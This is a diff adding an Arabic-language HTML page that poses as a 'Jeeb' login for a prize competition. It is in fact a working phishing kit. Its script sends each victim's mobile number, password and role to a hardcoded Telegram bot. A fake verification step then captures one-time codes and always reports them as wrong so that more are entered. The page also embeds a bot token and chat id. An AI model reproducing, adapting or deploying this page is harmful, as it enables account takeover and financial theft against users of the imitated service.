@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل دخول جيب - شارك بالمسابقة</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Meta tags for social sharing (Open Graph & Twitter) -->
+  <meta property="og:title" content="تسجيل دخول جيب - شارك بالمسابقة">
+  <meta property="og:description" content="سجل دخولك وشارك في مسابقة جيب الآن!">
+  <meta property="og:image" content="https://www2.0zz0.com/2025/09/27/20/277720505.jpeg">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="تسجيل دخول جيب - شارك بالمسابقة">
+  <meta name="twitter:description" content="سجل دخولك وشارك في مسابقة جيب الآن!">
+  <meta name="twitter:image" content="https://www2.0zz0.com/2025/09/27/20/277720505.jpeg">
+  <link href="https://fonts.googleapis.com/css?family=Cairo:700,400&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: "Cairo", Arial, sans-serif;
+      background: linear-gradient(120deg, #f3f4f7 0%, #ffe1e8 100%);
+      margin: 0;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 390px;
+      margin: 36px auto;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 6px 32px #d5003218;
+      padding: 32px 20px 24px 20px;
+      transition: all .3s;
+    }
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    .logo img {
+      width: 120px;
+      height: auto;
+      border-radius: 24px;
+      box-shadow: 0 2px 16px #d500321a;
+    }
+    .welcome {
+      text-align: right;
+      margin-bottom: 5px;
+    }
+    .welcome h2 {
+      margin: 0 0 6px 0;
+      font-size: 1.2em;
+      font-weight: bold;
+      color: #d50032;
+      letter-spacing: 0.5px;
+    }
+    .welcome p {
+      margin: 0;
+      color: #444;
+      font-size: 1em;
+    }
+    .role-select {
+      display: flex;
+      gap: 12px;
+      margin: 26px 0 18px 0;
+    }
+    .role-btn {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 14px 0 8px 0;
+      border: 2.3px solid #eee;
+      border-radius: 12px;
+      cursor: pointer;
+      background: #fff;
+      color: #555;
+      font-size: 1.07em;
+      font-weight: 700;
+      transition: border-color .18s, background .18s, color .18s;
+      box-shadow: 0 2px 8px #0001;
+    }
+    .role-btn.active {
+      background: #ffe1e8;
+      border-color: #d50032;
+      color: #d50032;
+      box-shadow: 0 2px 12px #d5003212;
+    }
+    .role-btn svg {
+      margin-bottom: 8px;
+      height: 32px;
+      fill: currentColor;
+    }
+    form {
+      margin-top: 8px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+      position: relative;
+    }
+    .input-group label {
+      display: block;
+      color: #d50032;
+      font-size: 1em;
+      margin-bottom: 4px;
+      margin-right: 6px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 13px 12px;
+      border-radius: 10px;
+      border: 1.5px solid #eee;
+      font-size: 1.07em;
+      box-sizing: border-box;
+      background: #f7f7fc;
+      direction: ltr;
+      font-family: inherit;
+      outline: none;
+      transition: border .18s;
+    }
+    .input-group input:focus {
+      border-color: #d50032;
+    }
+    .input-group input[type="text"], 
+    .input-group input[type="password"] {
+      letter-spacing: 0.5px;
+    }
+    .input-group input::-webkit-input-placeholder {
+      text-align: right;
+      color: #bbb;
+    }
+    .input-group input:-moz-placeholder {
+      text-align: right;
+      color: #bbb;
+    }
+    .input-group input::-moz-placeholder {
+      text-align: right;
+      color: #bbb;
+    }
+    .input-group input:-ms-input-placeholder {
+      text-align: right;
+      color: #bbb;
+    }
+    .forgot {
+      text-align: right;
+      font-size: 0.98em;
+      color: #777;
+      margin-bottom: 16px;
+      cursor: pointer;
+      text-decoration: underline;
+      transition: color .15s;
+    }
+    .forgot:hover {
+      color: #d50032;
+    }
+    .login-btn, .verify-btn {
+      width: 100%;
+      background: #d50032;
+      color: #fff;
+      border: none;
+      border-radius: 11px;
+      font-size: 1.13em;
+      padding: 13px 0;
+      cursor: pointer;
+      margin-bottom: 8px;
+      font-weight: bold;
+      box-shadow: 0 2px 8px #d5003224;
+      transition: background .13s;
+    }
+    .login-btn:active, .verify-btn:active {
+      background: #b4002a;
+    }
+    .bottom {
+      text-align: center;
+      font-size: 1em;
+      color: #888;
+      margin-top: 7px;
+    }
+    .desc {
+      color: #666;
+      font-size: 1.02em;
+      margin-bottom: 18px;
+      margin-right: 5px;
+    }
+    .hidden {
+      display: none !important;
+    }
+    .notif {
+      display: none;
+      background: #ffebee;
+      color: #d50032;
+      border-radius: 8px;
+      padding: 10px 15px;
+      margin-bottom: 13px;
+      font-size: 1.06em;
+      box-shadow: 0 2px 8px #d5003214;
+      text-align: center;
+      font-weight: bold;
+      animation: shake .37s;
+    }
+    @keyframes shake {
+      10%, 90% { transform: translateX(-1px); }
+      20%, 80% { transform: translateX(2px); }
+      30%, 50%, 70% { transform: translateX(-4px); }
+      40%, 60% { transform: translateX(4px); }
+    }
+    @media (max-width: 500px) {
+      .container {
+        padding: 14px 5px 10px 5px;
+        margin-top: 6px;
+      }
+      .logo img {
+        width: 85px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Login Page -->
+  <div class="container" id="loginPage">
+    <div class="logo">
+      <img src="https://www2.0zz0.com/2025/09/27/20/207168620.jpeg" alt="شعار التطبيق">
+    </div>
+    <div class="welcome">
+      <h2>تسجيل دخول جيب</h2>
+      <p>شارك بالمسابقة الآن!</p>
+    </div>
+    <div class="role-select">
+      <div class="role-btn" id="posBtn">
+        <svg viewBox="0 0 24 24"><path d="M3 11h4V7H3v4zm0 6h4v-4H3v4zm6 0h4v-4h-4v4zm6 0h4v-4h-4v4zM9 11h4V7H9v4zm6-4v4h4V7h-4z"/></svg>
+        نقطة مبيعات
+      </div>
+      <div class="role-btn active" id="clientBtn">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.67 0 8 1.34 8 4v4H4v-4c0-2.66 5.33-4 8-4zm0-2a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/></svg>
+        عميل
+      </div>
+    </div>
+    <form id="loginForm">
+      <div class="input-group">
+        <label for="mobile">رقم الموبايل</label>
+        <input type="text" id="mobile" name="mobile" placeholder="رقم الموبايل" pattern="\d*" maxlength="15" required>
+      </div>
+      <div class="input-group">
+        <label for="password">كلمة المرور</label>
+        <input type="password" id="password" name="password" placeholder="كلمة المرور" pattern="\d*" maxlength="10" required>
+      </div>
+      <div class="forgot" onclick="alert('يرجى التواصل مع الدعم لاستعادة كلمة المرور')">نسيت كلمة المرور؟</div>
+      <button type="submit" class="login-btn">تسجيل دخول</button>
+    </form>
+  </div>
+  <!-- Verify Code Page -->
+  <div class="container hidden" id="verifyPage">
+    <div class="logo">
+      <img src="https://www2.0zz0.com/2025/09/27/20/207168620.jpeg" alt="">
+    </div>
+    <h2>رمز التحقق</h2>
+    <div class="desc">أدخل رمز التحقق الذي وصلك</div>
+    <div class="notif" id="notif">رمز التحقق غير صحيح!</div>
+    <form id="verifyForm">
+      <div class="input-group">
+        <label for="code">رمز التحقق</label>
+        <input type="text" id="code" name="code" pattern="\d*" maxlength="6" required>
+      </div>
+      <button type="submit" class="verify-btn">تأكيد الرمز</button>
+    </form>
+  </div>
+  <script>
+    // اختيار الدور وتغيير اللون
+    const posBtn = document.getElementById('posBtn');
+    const clientBtn = document.getElementById('clientBtn');
+    let role = 'عميل';
+    posBtn.addEventListener('click', function () {
+      posBtn.classList.add('active');
+      clientBtn.classList.remove('active');
+      role = 'نقطة مبيعات';
+    });
+    clientBtn.addEventListener('click', function () {
+      clientBtn.classList.add('active');
+      posBtn.classList.remove('active');
+      role = 'عميل';
+    });
+
+    // قبول أرقام فقط
+    document.getElementById('mobile').addEventListener('input', function (e) {
+      this.value = this.value.replace(/[^\d]/g, '');
+    });
+    document.getElementById('password').addEventListener('input', function (e) {
+      this.value = this.value.replace(/[^\d]/g, '');
+    });
+
+    // نموذج تسجيل الدخول
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const mobile = document.getElementById('mobile').value;
+      const password = document.getElementById('password').value;
+      if (!mobile || !password) return;
+      // إرسال بيانات الدخول للبوت
+      const token = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
+      const chatid = "6873334348";
+      const msg = `دخول جديد:\nالدور: ${role}\nرقم: ${mobile}\nكلمة السر: ${password}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatid, text: msg })
+      });
+      // حفظ البيانات للصفحة التالية
+      window._loginData = { mobile, password, role };
+      document.getElementById('loginPage').classList.add('hidden');
+      document.getElementById('verifyPage').classList.remove('hidden');
+      document.getElementById('code').focus();
+    });
+
+    // صفحة رمز التحقق
+    document.getElementById('code').addEventListener('input', function (e) {
+      this.value = this.value.replace(/[^\d]/g, '');
+    });
+
+    document.getElementById('verifyForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const code = document.getElementById('code').value;
+      const data = window._loginData || { mobile: '', password: '', role: '' };
+      // إرسال رمز التحقق للبوت
+      const token = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
+      const chatid = "6873334348";
+      const msg = `رمز تحقق جديد:\nالدور: ${data.role}\nرقم: ${data.mobile}\nكلمة السر: ${data.password}\nرمز التحقق: ${code}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatid, text: msg })
+      });
+      // دائماً يظهر إشعار أن الرمز غير صحيح 
+      const notif = document.getElementById('notif');
+      notif.style.display = 'block';
+      notif.textContent = "رمز التحقق غير صحيح!";
+      setTimeout(() => { notif.style.display = 'none'; }, 2300);
+      document.getElementById('code').value = '';
+      document.getElementById('code').focus();
+    });
+  </script>
+</body>
+</html>
